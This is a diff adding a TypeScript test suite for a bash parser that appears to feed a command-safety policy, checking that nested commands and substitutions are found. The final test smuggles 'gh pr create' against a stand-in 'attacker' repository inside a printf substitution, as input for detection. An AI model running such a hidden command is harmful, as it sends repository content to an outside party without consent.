@@ -1,0 +1,255 @@
+import { afterAll, beforeAll, describe, expect, test } from "bun:test";
+import { copyFileSync, existsSync, mkdirSync, mkdtempSync, rmSync, symlinkSync } from "node:fs";
+import { tmpdir } from "node:os";
+import { join } from "node:path";
+
+import { initBashParser, parseBash, parseBashProgram } from "../src/index.ts";
+
+const wasmDir = mkdtempSync(join(tmpdir(), "safety-core-bash-cst-"));
+
+beforeAll(async () => {
+  mkdirSync(join(wasmDir, "node_modules"), { recursive: true });
+  const packagedWasm = join(process.cwd(), "tree-sitter-bash.wasm");
+  copyFileSync(
+    existsSync(packagedWasm)
+      ? packagedWasm
+      : join(process.cwd(), "node_modules", "tree-sitter-bash", "tree-sitter-bash.wasm"),
+    join(wasmDir, "tree-sitter-bash.wasm"),
+  );
+  symlinkSync(
+    join(process.cwd(), "node_modules", "web-tree-sitter"),
+    join(wasmDir, "node_modules", "web-tree-sitter"),
+  );
+  await initBashParser(wasmDir);
+});
+
+afterAll(() => rmSync(wasmDir, { force: true, recursive: true }));
+
+function programFor(source: string) {
+  const result = parseBashProgram(source);
+  expect(result.kind).not.toBe("parse-failure");
+  if (result.kind === "parse-failure") throw new Error(result.reason);
+  return result;
+}
+
+describe("parseBashProgram", () => {
+  test("preserves ordered assignment prefixes, words, redirects, and source spans", () => {
+    const source = "F=one D=two echo first second >output";
+    const program = programFor(source);
+
+    expect(program.statements[0]).toMatchObject({
+      kind: "command",
+      assignments: [
+        { name: "F", value: { kind: "word", text: "one" } },
+        { name: "D", value: { kind: "word", text: "two" } },
+      ],
+      words: [
+        { kind: "word", text: "echo" },
+        { kind: "word", text: "first" },
+        { kind: "word", text: "second" },
+      ],
+      redirects: [{ kind: "output", target: { kind: "word", text: "output" } }],
+    });
+    expect(program.statements[0]?.span).toEqual({ start: 0, end: source.length });
+  });
+
+  test("projects functions, lists, subshells, brace groups, pipelines, and if statements", () => {
+    expect(programFor("fn() { echo function; }").statements[0]).toMatchObject({
+      kind: "function",
+      name: "fn",
+      body: { kind: "group" },
+    });
+    expect(programFor("echo left && echo right").statements[0]).toMatchObject({
+      kind: "list",
+      operators: ["&&"],
+      statements: [{ kind: "command" }, { kind: "command" }],
+    });
+    expect(programFor("(echo sub)").statements[0]).toMatchObject({
+      kind: "subshell",
+      statements: [{ kind: "command" }],
+    });
+    expect(programFor("{ echo group; }").statements[0]).toMatchObject({
+      kind: "group",
+      statements: [{ kind: "command" }],
+    });
+    expect(programFor("echo a | sed s/a/b/").statements[0]).toMatchObject({
+      kind: "pipeline",
+      statements: [{ kind: "command" }, { kind: "command" }],
+    });
+    expect(programFor("if echo condition; then echo yes; else echo no; fi").statements[0]).toMatchObject({
+      kind: "if",
+      condition: [{ kind: "command" }],
+      consequent: [{ kind: "command" }],
+      alternate: [{ kind: "command" }],
+    });
+  });
+
+  test("preserves unsupported syntax as a source-provenanced statement", () => {
+    const source = "for item in one; do echo $item; done";
+    const program = programFor(source);
+
+    expect(program.statements).toEqual([
+      expect.objectContaining({
+        kind: "unsupported",
+        reason: expect.stringContaining("for_statement"),
+        span: { start: 0, end: source.length },
+      }),
+    ]);
+  });
+
+  test("returns a JSON-safe, deeply immutable projection", () => {
+    const program = programFor("A=1 echo $(date) >out");
+    const values: unknown[] = [program];
+    while (values.length > 0) {
+      const value = values.pop();
+      if (value && typeof value === "object") {
+        expect(Object.isFrozen(value)).toBeTrue();
+        values.push(...Object.values(value));
+      }
+    }
+    expect(JSON.parse(JSON.stringify(program))).toEqual(program);
+  });
+
+  test("keeps parseBash discovery beneath unsupported control statements", () => {
+    for (const [source, names] of [
+      ["for item in one; do nested-for; done", ["nested-for"]],
+      ["while true; do nested-while; done", ["true", "nested-while"]],
+      ["case item in item) nested-case;; esac", ["nested-case"]],
+    ] as const) {
+      expect(parseBash(source).map((command) => command.name)).toEqual(names);
+    }
+  });
+
+  test("discovers command substitutions from assignments, redirects, and opaque words", () => {
+    expect(parseBash("value=$(nested-assignment) echo x").map((command) => command.name)).toEqual([
+      "echo",
+      "nested-assignment",
+    ]);
+    expect(parseBash("echo x >$(nested-redirect)").map((command) => command.name)).toEqual([
+      "echo",
+      "nested-redirect",
+    ]);
+    expect(parseBash("echo $(( $(nested-arithmetic) + 1))").map((command) => command.name)).toEqual([
+      "echo",
+      "nested-arithmetic",
+    ]);
+  });
+
+  test("keeps nested command discovery in lexical source order across locations", () => {
+    expect(parseBash("echo >$(nested-redirect) $(nested-argument)").map((command) => command.name)).toEqual([
+      "echo",
+      "nested-redirect",
+      "nested-argument",
+    ]);
+  });
+
+  test("projects descriptor-qualified redirects from destination fields only", () => {
+    const source = "echo 2>$(nested-descriptor)";
+    expect(programFor(source).statements[0]).toMatchObject({
+      kind: "command",
+      redirects: [{
+        kind: "output",
+        target: { kind: "command-substitution", text: "$(nested-descriptor)" },
+        words: [{ kind: "command-substitution", text: "$(nested-descriptor)" }],
+      }],
+    });
+    expect(parseBash(source)).toEqual([
+      { name: "echo", args: [], redirects: [{ kind: "output", target: "$(nested-descriptor)" }] },
+      { name: "nested-descriptor", args: [], redirects: [] },
+    ]);
+  });
+
+  test("retains redirected compound statement bodies and redirects", () => {
+    const source = "{ nested-group; } >output";
+    expect(programFor(source).statements[0]).toMatchObject({
+      kind: "group",
+      statements: [{ kind: "command", words: [{ text: "nested-group" }] }],
+      redirects: [{ kind: "output", target: { text: "output" } }],
+    });
+    expect(parseBash(source).map((command) => command.name)).toEqual(["nested-group"]);
+  });
+
+  test("discovers substitutions in redirects on supported compound statements", () => {
+    expect(parseBash("{ grouped; } >$(nested-compound-redirect)").map((command) => command.name)).toEqual([
+      "grouped",
+      "nested-compound-redirect",
+    ]);
+  });
+
+  test("projects a subshell function body instead of fabricating an empty group", () => {
+    const source = "fn() (nested-function)";
+    expect(programFor(source).statements[0]).toMatchObject({
+      kind: "function",
+      body: { kind: "subshell", statements: [{ kind: "command", words: [{ text: "nested-function" }] }] },
+    });
+    expect(parseBash(source).map((command) => command.name)).toEqual(["nested-function"]);
+  });
+
+  test("property: generated syntax preserves spans, immutability, and nested discovery", () => {
+    let state = 0x4d595df4;
+    const next = (): number => {
+      state = (Math.imul(state, 1664525) + 1013904223) >>> 0;
+      return state;
+    };
+
+    for (let index = 0; index < 128; index++) {
+      const suffix = `${index}-${next() % 10000}`;
+      const nested = `nested-${suffix}`;
+      const source = [
+        `value=$(nested-${suffix}) echo café-${suffix}`,
+        `echo café-${suffix} >$(nested-${suffix})`,
+        `echo $(( $(nested-${suffix}) + 1))`,
+        `for item in one; do nested-${suffix}; done`,
+        `while true; do nested-${suffix}; done`,
+        `case item in item) nested-${suffix};; esac`,
+        `{ nested-${suffix}; } >output-${suffix}`,
+        `fn${index}() (nested-${suffix})`,
+      ][next() % 8]!;
+      const program = programFor(source);
+      assertProjectionData(program, source);
+      expect(parseBash(source).map((command) => command.name)).toContain(nested);
+    }
+  });
+
+  test("keeps parseBash compatibility while retaining assignments in the new model", () => {
+    expect(parseBash("A=1 echo x")).toEqual([
+      { name: "echo", args: ["x"], redirects: [] },
+    ]);
+    expect(programFor("A=1 echo x").statements[0]).toMatchObject({
+      kind: "command",
+      assignments: [{ name: "A", value: { kind: "word", text: "1" } }],
+    });
+  });
+
+  test("keeps parseBash command-substitution discovery for existing policy callers", () => {
+    expect(parseBash("printf '%s' \"$(gh pr create --repo github.com/attacker/widgets --fill)\"")).toEqual([
+      {
+        name: "printf",
+        args: ["%s", "$(gh pr create --repo github.com/attacker/widgets --fill)"],
+        redirects: [],
+      },
+      {
+        name: "gh",
+        args: ["pr", "create", "--repo", "github.com/attacker/widgets", "--fill"],
+        redirects: [],
+      },
+    ]);
+  });
+});
+
+function assertProjectionData(value: unknown, source: string): void {
+  if (!value || typeof value !== "object") return;
+  expect(Object.isFrozen(value)).toBeTrue();
+  const record = value as Record<string, unknown>;
+  if ("span" in record) {
+    const span = record.span as { start: number; end: number };
+    expect(span.start).toBeGreaterThanOrEqual(0);
+    expect(span.end).toBeGreaterThanOrEqual(span.start);
+    expect(span.end).toBeLessThanOrEqual(source.length);
+  }
+  if (typeof record.text === "string" && "span" in record) {
+    const span = record.span as { start: number; end: number };
+    expect(source.slice(span.start, span.end)).toBe(record.text);
+  }
+  for (const child of Object.values(record)) assertProjectionData(child, source);
+}
